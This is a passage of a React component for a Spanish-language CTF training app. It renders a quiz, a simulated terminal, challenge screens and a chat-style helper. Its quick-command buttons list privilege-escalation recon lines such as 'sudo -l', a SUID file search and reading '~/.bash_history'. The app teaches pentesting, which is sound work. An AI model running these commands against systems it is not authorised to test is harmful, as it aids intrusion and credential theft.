              let bg = PANEL, border = BORDER, color = TEXT;
              if (enviado) {
                if (i === nivelActual.correcta) { bg = "#002200"; border = "#22c55e"; color = "#22c55e"; }
                else if (i === respuesta && i !== nivelActual.correcta) { bg = "#1a0505"; border = "#ff3b3b"; color = "#ff6b6b"; }
              } else if (respuesta === i) { border = bloqueActivo.color; color = "#fff"; }
              return (
                <button key={i} className="t-opt" disabled={enviado}
                  onClick={() => responderQuiz(i)}
                  style={{ background: bg, border: `1px solid ${border}`, color }}>
                  <span style={{ color: bloqueActivo.color, marginRight: 10 }}>{["A", "B", "C", "D"][i]}.</span>{opt}
                </button>
              );
            })}
          </div>

          {enviado && (
            <div className="fade-in" style={{ opacity: 0 }}>
              <div style={{ background: respuesta === nivelActual.correcta ? "#002200" : "#0d0505", border: `1px solid ${respuesta === nivelActual.correcta ? "#22c55e44" : "#ff3b3b44"}`, borderRadius: 8, padding: "14px 18px", marginBottom: 16 }}>
                <div style={{ color: respuesta === nivelActual.correcta ? "#22c55e" : "#ff6b35", fontWeight: "bold", fontSize: 12, marginBottom: 6, letterSpacing: 1 }}>
                  {respuesta === nivelActual.correcta ? "✅ CORRECTO" : "❌ INCORRECTO"}
                  {respuesta === nivelActual.correcta && <span style={{ color: bloqueActivo.color, marginLeft: 12 }}>+{nivelActual.xp} XP</span>}
                </div>
                <div style={{ color: "#c9d1d9", fontSize: 12, lineHeight: 1.7 }}>💡 {nivelActual.explicacion}</div>
              </div>
              <button className="t-btn" onClick={siguienteNivel}
                style={{ background: bloqueActivo.color, color: "#000", padding: "12px 28px", fontSize: 13, width: "100%", letterSpacing: 2 }}>
                {nivelIdx < bloqueActivo.niveles.length - 1 ? "SIGUIENTE NIVEL →" : "✅ BLOQUE COMPLETADO →"}
              </button>
            </div>
          )}
        </div>
      )}
    </div>
  );

  // ── SHELL SIMULADOR ──
  if (vista === "shell") return (
    <div style={{ fontFamily: "'JetBrains Mono',monospace", color: "#c9d1d9" }}>
      <style>{CSS_TERMINAL}</style>

      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
        <button className="t-btn" onClick={() => setVista("menu")} style={{ background: PANEL, color: TEXT, padding: "8px 16px", fontSize: 11, border: `1px solid ${BORDER}` }}>← MENÚ</button>
        <div style={{ color: CYAN, fontSize: 11, letterSpacing: 3 }}>◈ TERMINAL SIMULATOR</div>
        <div style={{ color: TEXT, fontSize: 11 }}>
          {estadoShell.usuario === "root" ? <span style={{ color: "#f43f5e" }}>⚠️ ROOT</span> : <span style={{ color: "#4ade80" }}>● {estadoShell.usuario}</span>}
        </div>
      </div>

      {/* Terminal */}
      <div style={{ background: "#020810", border: `1px solid ${CYAN}33`, borderRadius: 10, overflow: "hidden", boxShadow: `0 0 30px ${CYAN}11` }}>
        {/* Barra superior */}
        <div style={{ background: "#040c18", padding: "10px 16px", borderBottom: `1px solid ${BORDER}`, display: "flex", justifyContent: "space-between", alignItems: "center" }}>
          <div style={{ display: "flex", gap: 6 }}>
            {["#ff5f57", "#ffbd2e", "#28ca41"].map((c, i) => <div key={i} style={{ width: 12, height: 12, borderRadius: "50%", background: c }} />)}
          </div>
          <span style={{ color: TEXT, fontSize: 11 }}>{estadoShell.usuario}@{estadoShell.hostname}: {estadoShell.directorio}</span>
          <span style={{ color: TEXT, fontSize: 10 }}>bash</span>
        </div>

        {/* Output */}
        <div className="scrollbar" style={{ height: 380, overflowY: "auto", padding: 16 }} onClick={() => shellInputRef.current?.focus()}>
          {historial.map((line, i) => (
            <div key={i} style={{
              fontSize: 12, lineHeight: 1.8, marginBottom: 2, whiteSpace: "pre-wrap", wordBreak: "break-all",
              color: line.tipo === "input" ? CYAN : line.tipo === "sistema" ? "#f59e0b" : "#4ade80"
            }}>
              {line.texto}
            </div>
          ))}
          <div ref={shellEndRef} />
        </div>

        {/* Input */}
        <div style={{ background: "#040c18", borderTop: `1px solid ${BORDER}`, padding: "10px 16px", display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{ color: estadoShell.usuario === "root" ? "#f43f5e" : CYAN, fontSize: 12, flexShrink: 0, userSelect: "none" }}>
            {estadoShell.usuario}@{estadoShell.hostname}:{estadoShell.directorio}{estadoShell.usuario === "root" ? "#" : "$"}
          </span>
          <input ref={shellInputRef}
            className="t-input"
            style={{ background: "transparent", border: "none", flex: 1, padding: "0", color: "#fff" }}
            value={inputShell}
            onChange={e => setInputShell(e.target.value)}
            onKeyDown={handleKeyShell}
            placeholder="escribe un comando..."
            autoFocus
            spellCheck={false}
          />
          <span className="cursor">█</span>
        </div>
      </div>

      {/* Ayuda rápida */}
      <div style={{ marginTop: 16, display: "grid", gridTemplateColumns: "repeat(auto-fill,minmax(160px,1fr))", gap: 8 }}>
        {["whoami", "ls -la", "cat user.txt", "sudo -l", "find / -perm -4000 2>/dev/null", "cat ~/.bash_history"].map(cmd => (
          <button key={cmd} onClick={() => { setInputShell(cmd); shellInputRef.current?.focus(); }}
            style={{ background: PANEL, border: `1px solid ${BORDER}`, color: TEXT, padding: "6px 10px", borderRadius: 4, fontSize: 11, cursor: "pointer", textAlign: "left", fontFamily: "'JetBrains Mono',monospace" }}
            onMouseEnter={e => { e.target.style.borderColor = CYAN + "44"; e.target.style.color = CYAN; }}
            onMouseLeave={e => { e.target.style.borderColor = BORDER; e.target.style.color = TEXT; }}>
            {cmd}
          </button>
        ))}
      </div>
    </div>
  );

  // ── DESAFÍOS CTF ──
  if (vista === "desafios" && !desafioActivo) return (
    <div style={{ fontFamily: "'Rajdhani',sans-serif", color: "#c9d1d9" }}>
      <style>{CSS_TERMINAL}</style>
      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 24 }}>
        <button className="t-btn" onClick={() => setVista("menu")} style={{ background: PANEL, color: TEXT, padding: "8px 16px", fontSize: 11, border: `1px solid ${BORDER}` }}>← MENÚ</button>
        <div style={{ color: "#f59e0b", fontSize: 11, letterSpacing: 3 }}>◈ CTF LABS</div>
        <div />
      </div>

      <h2 style={{ color: "#fff", fontSize: 20, marginBottom: 8 }}>Desafíos CTF Simulados</h2>
      <p style={{ color: TEXT, fontSize: 13, marginBottom: 24, fontFamily: "'JetBrains Mono',monospace" }}>
        Escenarios reales inspirados en TryHackMe. Practica metodología CTF completa.
      </p>

      <div style={{ display: "flex", flexDirection: "column", gap: 14 }}>
        {DESAFIOS.map(d => (
          <div key={d.id}
            className="fade-in"
            onClick={() => { setDesafioActivo(d); setPasoDesafio(0); setDesafioCompletado(false); setVista("desafio_activo"); setHistorial([{ tipo: "sistema", texto: `🏴 DESAFÍO: ${d.titulo}` }, { tipo: "sistema", texto: `Objetivo: ${d.objetivos[0]}` }, { tipo: "sistema", texto: "─".repeat(40) }]); }}
            style={{ background: PANEL, border: `1px solid ${BORDER}`, borderRadius: 10, padding: 20, cursor: "pointer", transition: "all .2s" }}
            onMouseEnter={e => { e.currentTarget.style.borderColor = "#f59e0b44"; }}
            onMouseLeave={e => { e.currentTarget.style.borderColor = BORDER; }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 8 }}>
              <div style={{ color: "#fff", fontWeight: "bold", fontSize: 16 }}>{d.titulo}</div>
              <div style={{ display: "flex", gap: 8 }}>
                <span style={{ background: d.dificultad === "Fácil" ? "#22c55e22" : d.dificultad === "Medio" ? "#f59e0b22" : "#f43f5e22", color: d.dificultad === "Fácil" ? "#22c55e" : d.dificultad === "Medio" ? "#f59e0b" : "#f43f5e", fontSize: 10, padding: "3px 8px", borderRadius: 4, letterSpacing: 1 }}>{d.dificultad.toUpperCase()}</span>
                <span style={{ background: "#a78bfa22", color: "#a78bfa", fontSize: 10, padding: "3px 8px", borderRadius: 4 }}>+{d.xp} XP</span>
              </div>
            </div>
            <div style={{ color: TEXT, fontSize: 13, marginBottom: 10, fontFamily: "'JetBrains Mono',monospace" }}>{d.descripcion}</div>
            <div style={{ display: "flex", gap: 8, flexWrap: "wrap" }}>
              {d.objetivos.map((obj, i) => (
                <span key={i} style={{ background: BG, border: `1px solid ${BORDER}`, color: TEXT, fontSize: 11, padding: "3px 8px", borderRadius: 4 }}>{i + 1}. {obj}</span>
              ))}
            </div>
          </div>
        ))}
      </div>
    </div>
  );

  // ── DESAFÍO ACTIVO ──
  if (vista === "desafio_activo" && desafioActivo) return (
    <div style={{ fontFamily: "'JetBrains Mono',monospace", color: "#c9d1d9" }}>
      <style>{CSS_TERMINAL}</style>

      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 16 }}>
        <button className="t-btn" onClick={() => { setVista("desafios"); setDesafioActivo(null); }} style={{ background: PANEL, color: TEXT, padding: "8px 16px", fontSize: 11, border: `1px solid ${BORDER}` }}>← DESAFÍOS</button>
        <div style={{ color: "#f59e0b", fontSize: 11, letterSpacing: 2 }}>🏴 {desafioActivo.titulo}</div>
        <div style={{ color: desafioCompletado ? "#22c55e" : TEXT, fontSize: 11 }}>
          {desafioCompletado ? "✅ COMPLETADO" : `Paso ${pasoDesafio + 1}/${desafioActivo.solucion.length}`}
        </div>
      </div>

      {/* Objetivos */}
      <div style={{ background: PANEL, border: `1px solid #f59e0b33`, borderRadius: 8, padding: 16, marginBottom: 16 }}>
        <div style={{ color: "#f59e0b", fontSize: 10, letterSpacing: 2, marginBottom: 10 }}>OBJETIVOS</div>
        {desafioActivo.objetivos.map((obj, i) => (
          <div key={i} style={{ display: "flex", gap: 10, marginBottom: 6, fontSize: 12, color: i < pasoDesafio ? "#22c55e" : i === pasoDesafio ? "#fff" : TEXT }}>
            <span>{i < pasoDesafio ? "✅" : i === pasoDesafio ? "▶" : "○"}</span>
            <span>{obj}</span>
          </div>
        ))}
        {!desafioCompletado && (
          <div style={{ marginTop: 12, padding: "8px 12px", background: "#f59e0b11", border: "1px solid #f59e0b33", borderRadius: 6, color: "#f59e0b", fontSize: 11 }}>
            💡 Pista: {desafioActivo.pistas[pasoDesafio]}
          </div>
        )}
      </div>

      {/* Terminal del desafío */}
      <div style={{ background: "#020810", border: `1px solid ${CYAN}33`, borderRadius: 10, overflow: "hidden" }}>
        <div style={{ background: "#040c18", padding: "10px 16px", borderBottom: `1px solid ${BORDER}`, display: "flex", gap: 6 }}>
          {["#ff5f57", "#ffbd2e", "#28ca41"].map((c, i) => <div key={i} style={{ width: 12, height: 12, borderRadius: "50%", background: c }} />)}
          <span style={{ color: TEXT, fontSize: 11, marginLeft: 6 }}>CTF Lab — {desafioActivo.titulo}</span>
        </div>
        <div className="scrollbar" style={{ height: 300, overflowY: "auto", padding: 16 }}>
          {historial.map((line, i) => (
            <div key={i} style={{ fontSize: 12, lineHeight: 1.8, marginBottom: 2, whiteSpace: "pre-wrap", wordBreak: "break-all", color: line.tipo === "input" ? CYAN : line.tipo === "sistema" ? "#f59e0b" : "#4ade80" }}>
              {line.texto}
            </div>
          ))}
          <div ref={shellEndRef} />
        </div>
        <div style={{ background: "#040c18", borderTop: `1px solid ${BORDER}`, padding: "10px 16px", display: "flex", alignItems: "center", gap: 8 }}>
          <span style={{ color: CYAN, fontSize: 12, flexShrink: 0 }}>{estadoShell.usuario}@{estadoShell.hostname}:{estadoShell.directorio}$</span>
          <input className="t-input" style={{ background: "transparent", border: "none", flex: 1, padding: 0, color: "#fff" }}
            value={inputShell} onChange={e => setInputShell(e.target.value)}
            onKeyDown={handleKeyShell} placeholder="escribe el comando..." autoFocus spellCheck={false} />
        </div>
      </div>
    </div>
  );

  // ── ASISTENTE IA ──
  if (vista === "ia") return (
    <div style={{ fontFamily: "'JetBrains Mono',monospace", color: "#c9d1d9" }}>
      <style>{CSS_TERMINAL}</style>

      <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: 20 }}>
        <button className="t-btn" onClick={() => setVista("menu")} style={{ background: PANEL, color: TEXT, padding: "8px 16px", fontSize: 11, border: `1px solid ${BORDER}` }}>← MENÚ</button>
        <div style={{ color: "#a78bfa", fontSize: 11, letterSpacing: 3 }}>◈ ASISTENTE TERMINAL</div>
        <div />
      </div>

      {/* Chat */}
      <div style={{ background: PANEL, border: `1px solid #a78bfa33`, borderRadius: 10, overflow: "hidden", marginBottom: 16 }}>
        <div className="scrollbar" style={{ height: 400, overflowY: "auto", padding: 20, display: "flex", flexDirection: "column", gap: 16 }}>
          {mensajesIA.map((msg, i) => (
            <div key={i} className="fade-in" style={{ opacity: 0, display: "flex", gap: 12, alignItems: "flex-start", flexDirection: msg.rol === "user" ? "row-reverse" : "row" }}>
              <div style={{ width: 32, height: 32, borderRadius: "50%", background: msg.rol === "ia" ? "#a78bfa22" : "#00d4ff22", border: `1px solid ${msg.rol === "ia" ? "#a78bfa44" : "#00d4ff44"}`, display: "flex", alignItems: "center", justifyContent: "center", fontSize: 14, flexShrink: 0 }}>
                {msg.rol === "ia" ? "🤖" : "👤"}
              </div>
              <div style={{ background: msg.rol === "ia" ? "#0a1628" : "#060d1a", border: `1px solid ${msg.rol === "ia" ? "#a78bfa33" : "#00d4ff33"}`, borderRadius: 8, padding: "10px 14px", maxWidth: "80%", fontSize: 12, lineHeight: 1.8, color: msg.rol === "ia" ? "#c9d1d9" : CYAN, whiteSpace: "pre-wrap" }}>
                {msg.texto}
              </div>
            </div>
          ))}
          <div ref={iaEndRef} />
        </div>

        {/* Input IA */}
        <div style={{ borderTop: `1px solid ${BORDER}`, padding: 16, display: "flex", gap: 10 }}>
          <input className="t-input" style={{ flex: 1 }}
            value={inputIA} onChange={e => setInputIA(e.target.value)}
            onKeyDown={e => e.key === "Enter" && responderIA(inputIA)}
            placeholder="Pregunta sobre nmap, reverse shells, privilege escalation..." />
          <button className="t-btn" onClick={() => responderIA(inputIA)}
            style={{ background: "#a78bfa", color: "#000", padding: "10px 20px", fontSize: 12, letterSpacing: 1 }}>
            ENVIAR
          </button>
        </div>
      </div>

      {/* Preguntas rápidas */}
      <div style={{ color: TEXT, fontSize: 10, letterSpacing: 2, marginBottom: 10 }}>PREGUNTAS FRECUENTES</div>
      <div style={{ display: "flex", flexWrap: "wrap", gap: 8 }}>
        {["¿Cómo uso nmap?", "¿Qué es una reverse shell?", "¿Cómo escalo privilegios?", "¿Cómo uso gobuster?", "¿Qué es SQLi?", "¿Cómo crackeo hashes con john?", "¿Cómo me conecto a TryHackMe?", "¿Qué es LinPEAS?"].map(q => (
          <button key={q} onClick={() => responderIA(q)}
            style={{ background: PANEL, border: `1px solid #a78bfa33`, color: "#a78bfa", padding: "6px 12px", borderRadius: 20, fontSize: 11, cursor: "pointer", fontFamily: "'JetBrains Mono',monospace", transition: "all .15s" }}
            onMouseEnter={e => { e.target.style.background = "#a78bfa22"; }}
            onMouseLeave={e => { e.target.style.background = PANEL; }}>
            {q}
          </button>
        ))}
      </div>
    </div>
  );

  return null;
}

// ============================================================
// FIN DEL ARCHIVO Terminal.jsx
// Las salas THM se cargan desde thm_salas.js
// ============================================================
